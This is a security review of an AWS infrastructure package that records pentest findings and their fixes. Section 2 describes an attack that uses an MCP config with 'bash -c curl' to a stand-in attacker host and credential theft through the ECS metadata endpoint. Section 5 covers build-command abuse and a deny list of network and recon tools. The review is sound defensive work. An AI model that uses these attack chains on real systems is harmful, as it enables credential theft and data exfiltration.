# Security Review — ATX Remote Infrastructure

Pentest findings, analysis, and dispositions for the `kiro-power-agent-skill-cdk` package.

---

## 1. Fargate Tasks Assigned Public IP Addresses

**Finding:** ECS tasks launched via Batch have public IP addresses (e.g., `54.90.43.190`). The reviewer notes there is no inbound SG rule, so the tasks don't need to be internet-reachable.

**Analysis:** Correct — the public IP is not required for the tasks to *receive* inbound traffic (the security group blocks all inbound). However, it is required for the tasks to *reach* the internet in the current architecture.

The tasks run in the default VPC's public subnets. In AWS, Fargate tasks in public subnets must have `assignPublicIp: ENABLED` to route outbound traffic through the Internet Gateway — the IGW requires a public IP for return traffic routing. The tasks need outbound internet for:

- Cloning git repositories (`git clone` over HTTPS/SSH)
- Pulling container images from ECR
- Build-time dependency downloads (Maven Central, npm registry, PyPI, etc.)
- AWS Transform service API calls

The alternative — private subnets with a NAT gateway — would eliminate the public IP but adds ~$32/month in fixed infrastructure cost plus data processing charges. This is a meaningful baseline cost for infrastructure that may only run jobs occasionally.

**Mitigations in place:**
- Security group has zero inbound rules — the public IP is effectively unreachable
- Tasks are ephemeral (run transformation, upload results, terminate)
- No listening services run on the container
- Users who require private networking can provide their own private subnets via `existingSubnetIds`, which automatically disables the public IP assignment

**Disposition:** Accepted risk. The public IP has no inbound attack surface. Mandating a NAT gateway would add cost for all customers to address a cosmetic concern. Private subnet support is available for customers with stricter requirements.

---

## 2. MCP Configuration Enables Arbitrary Code Execution in Container

**Finding:** An attacker with Lambda invoke permissions can achieve arbitrary code execution on the Batch container by:

1. Calling `atx-configure-mcp` to write a malicious MCP server config to S3 (e.g., a server with `"command": "bash", "args": ["-c", "curl http://attacker.com/..."]`)
2. Calling `atx-trigger-job` with `command: "atx mcp tools"` — ATX loads the MCP config and spawns the malicious server process
3. The malicious process runs with the Batch job role's credentials (S3 read/write, KMS, Secrets Manager `atx/*`)

**Analysis:** Valid finding. The attack chain works because:

- `atx-configure-mcp` accepts arbitrary JSON with no structural validation — any `command`/`args` can be specified for MCP servers
- `atx mcp tools` passes command validation (starts with `atx`, no dangerous patterns, safe characters)
- The entrypoint downloads the MCP config from S3 and places it at `~/.aws/atx/mcp.json` before ATX runs
- ATX spawns MCP server processes defined in the config, executing whatever `command` is specified

The prerequisite — Lambda invoke permissions — limits the blast radius to users who already have significant access to the account. However, this turns read-level Lambda invoke access into full container code execution with the Batch job role's credentials.

**Recommendation:** Fix required. Two changes:

1. **Restrict allowed commands in `validateCommand()`** — add an allowlist of permitted ATX subcommands (e.g., `atx custom def exec`, `atx custom def list`, `atx custom def get`). Reject commands like `atx mcp tools`, `atx` (interactive mode), and any subcommand not needed for batch execution.

2. **Validate MCP config structure in `configure-mcp` Lambda** — enforce that server entries only use known-safe commands (e.g., `npx`, `uvx`, `node`, `python`, `python3`) and reject entries with shell interpreters (`bash`, `sh`, `cmd`) or absolute paths.

**Disposition:** Fixed.

- `lambda/utils/index.ts`: `validateCommand()` now enforces a command allowlist — only `atx custom def exec`, `atx custom def list`, and `atx custom def get` are permitted. All other ATX subcommands (including `atx mcp tools`) are rejected at the Lambda layer before a Batch job is submitted.
- `lambda/utils/index.ts`: `validateMcpConfig()` validates MCP config structure — server `command` fields must be from an allowlist (`npx`, `uvx`, `node`, `python`, `python3`), must not contain path separators, and must be strings. This blocks the direct `bash -c "curl ..."` attack vector.
- `lambda/configure-mcp/index.ts`: Calls `validateMcpConfig()` before writing config to S3.
- Defense-in-depth: the entrypoint.sh `validate_command()` function provides a second layer of validation inside the container itself.
- 29 unit tests pass covering both fixes (`test/security-input-validation.test.ts`), including dedicated `validateMcpConfig` tests for allowed commands, shell interpreters, path traversal, arbitrary executables, and malformed configs.
- Note: A specific variant of this attack using `curl` to exfiltrate ECS task credentials via the metadata endpoint (`169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`) was also confirmed blocked — `curl` fails both the path separator check and the command allowlist.

---

## 3. Teardown Script May Delete Unrelated ECR Repositories

**Finding:** The teardown script's ECR cleanup matches any repository starting with `cdk-` that contains `container-assets`. This could match ECR repos belonging to other CDK-bootstrapped stacks in the same account.

**Analysis:** Valid finding. The CDK bootstrap for this project uses the qualifier `atxinfra`, producing repos named `cdk-atxinfra-container-assets-{account}-{region}`. The original pattern was unnecessarily broad.

**Disposition:** Fixed.

- `teardown.sh`: ECR cleanup now matches `cdk-atxinfra-container-assets-` prefix specifically, scoped to this project's CDK qualifier. No longer matches repos from other CDK stacks.

---

## 4. Environment Variable Values Passed Through Without Validation

**Finding:** The `JAVA_VERSION`, `PYTHON_VERSION`, and `NODE_VERSION` environment variables accept arbitrary string values from the Lambda input and pass them through to the container. While the entrypoint's `case` statements reject unknown values gracefully (logging a warning and using defaults), arbitrary input should be rejected at the Lambda layer.

**Analysis:** Low severity — no code execution was demonstrated. The entrypoint handles unknown values safely. However, defense-in-depth dictates validating at the earliest point.

**Disposition:** Fixed.

- `lambda/utils/index.ts`: Added `validateEnvironment()` with format-based regex patterns (Java/Node: 1–2 digit number, Python: optional `3.` prefix + 1–2 digit number). Accepts any valid version number including custom Dockerfile additions, while rejecting injection strings.
- `lambda/trigger-job/index.ts`: Calls `validateEnvironment()` before submitting the job.
- `lambda/trigger-batch-jobs/index.ts`: Calls `validateEnvironment()` for each job in the batch before submission.
- 36 unit tests pass covering valid versions, injection strings, invalid formats, and multi-key validation.

---

## 5. Build Command Flag (-c / --build-command) Enables Code Execution

**Finding:** The `-c` / `--build-command` flag in `atx custom def exec` accepts an arbitrary command that ATX executes as a subprocess. An attacker with Lambda invoke permissions can pass `-c export` to dump container credentials, or `-c curl` to exfiltrate data. This bypasses command validation since the payload is inside a valid ATX command argument.

**Analysis:** Valid finding. The `-c` flag is a legitimate feature (custom build commands like `mvn clean install`), so it cannot be blocked entirely. The existing dangerous patterns check catches chained commands (`&&`, `||`, `;`) but not single-word recon/exfiltration tools.

**Disposition:** Fixed.

- `lambda/utils/index.ts`: `validateCommand()` now extracts build command values from `-c`, `--build-command`, and `--configuration buildCommand=` patterns, and checks the executable against a deny list of recon/exfiltration tools: `curl`, `wget`, `nc`, `ncat`, `dig`, `nslookup`, `whoami`, `id`, `printenv`, `base64`, `dd`, `mount`, `ss`, `netstat`, `ifconfig`.
- Legitimate build commands (`mvn`, `gradle`, `npm`, `make`, `export JAVA_HOME=... mvn`, etc.) are unaffected.
- 42 unit tests pass covering `-c`, `--build-command`, and `--configuration buildCommand=` variants for both allowed and denied commands.

---

## 6. Predictable S3 Bucket Names (Bucket Squatting)

**Finding:** Bucket names follow a predictable pattern (`atx-source-code-{accountId}`, `atx-custom-output-{accountId}`). Could an attacker pre-create these buckets?

**Disposition:** N/A. Buckets are created by CloudFormation inside the customer's account. If the name is already taken, the stack fails with `BucketAlreadyExists` — it does not silently reference an external bucket. Lambda environment variables are populated from CloudFormation outputs, so they only ever point to buckets the stack successfully created.

---

## 7. Lambda Functions Can Describe/Terminate Arbitrary Batch Jobs

**Finding:** The `get-job-status` and `terminate-job` Lambda roles use `Resource: *` for `batch:DescribeJobs` and `batch:TerminateJob`. A caller could look up or terminate Batch jobs from other workloads in the same account.

**Disposition:** N/A — AWS service limitation. Per the [AWS Batch IAM authorization reference](https://docs.aws.amazon.com/service-authorization/latest/reference/list_awsbatch.html#awsbatch-resources-for-iam-policies), `DescribeJobs` and `TerminateJob` do not support resource-level permissions. `Resource: *` is the only valid configuration. This cannot be scoped to a specific job queue or job definition via IAM policy.
